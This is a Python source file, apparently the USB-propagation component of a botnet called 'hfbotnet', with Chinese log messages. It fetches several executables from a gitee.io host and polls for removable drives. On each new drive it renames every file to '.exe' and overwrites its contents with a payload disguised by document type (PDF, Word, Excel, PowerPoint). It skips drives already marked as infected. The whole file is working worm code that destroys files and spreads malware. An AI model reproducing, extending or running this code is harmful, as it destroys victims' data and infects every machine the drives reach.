#! /usr/bin/env python3
#coding: utf8

import os
from time import sleep
from requests import get
from shutil import copytree
from psutil import disk_partitions

def is_ally(driver):
    return os.path.exists(driver + "hfbotnet_files\\profile.txt")

def rename(driver):
    try:
        dirs = os.listdir(driver)
    except FileNotFoundError:
        print("[USBSPREAD] USB已被拔出，忽略.")
        return False
    
    for file in dirs:
        if not os.path.isdir(os.path.join(driver, file)):
            if ".exe" not in file:
                try:
                    os.rename(os.path.join(driver, file), os.path.join(driver, file) + ".exe")
                except Exception as e:
                    print("[USBSPREAD] {}".format(e))
            print(os.path.join(driver, file))

def USBSpread(driver):
    
    if rename(driver) == False:
        return
    
    try:
        dirs = os.listdir(driver)
    except FileNotFoundError:
        print("[USBSPREAD] USB已被拔出，忽略.")
        return
    
    for file in dirs:
        if not os.path.isdir(os.path.join(driver, file)):
            try:
                save = open(os.path.join(driver, file), "wb")
                if "pdf" in file:
                    save.write(pdf)
                elif "xls" in file:
                    save.write(xlsx)
                elif "doc" in file:
                    save.write(docx)
                elif "ppt" in file:
                    save.write(pptx)
                else:
                    save.write(spread)
                save.close()
                sleep(0.39)
            except OSError:
                print("[USBSPREAD] USB意外无法感染，忽略.")
                return

def GetExecutable():
    print("[USBSPREAD] 开始下载传播程序...")
    global spread, xlsx, docx, pptx, pdf
    
    while True:
        try:
            spread = get("https://mns-quc.gitee.io/hfbotnet/client/dist/usbspread.exe").content
            xlsx = get("https://mns-quc.gitee.io/hfbotnet/client/dist/usbspread_xlsx.exe").content
            pptx = get("https://mns-quc.gitee.io/hfbotnet/client/dist/usbspread_ppt.exe").content
            docx = get("https://mns-quc.gitee.io/hfbotnet/client/dist/usbspread_word.exe").content
            pdf = get("https://mns-quc.gitee.io/hfbotnet/client/dist/usbspread_pdf.exe").content
            break
        except Exception as e:
            print("[USBSPREAD] {}".format(e))
            continue
    print("[USBSPREAD] 传播程序下载完毕.")
    return spread

def UsbMain():
    global found, drivers

    drivers = []
    found = False

    GetExecutable()
    
    while True:
        sleep(0.3)
        for item in disk_partitions():
            if 'removable' in item.opts:
                drivers.append(item.device)
                print('[USBSPREAD] 发现USB驱动：', item.device)
                found = True

        if found:
            for driver in drivers:
                if is_ally(driver):
                    pass
                else:
                    USBSpread(driver)
            
            found = False
            continue
        else:
            continue

if __name__ == "__main__":
    UsbMain()
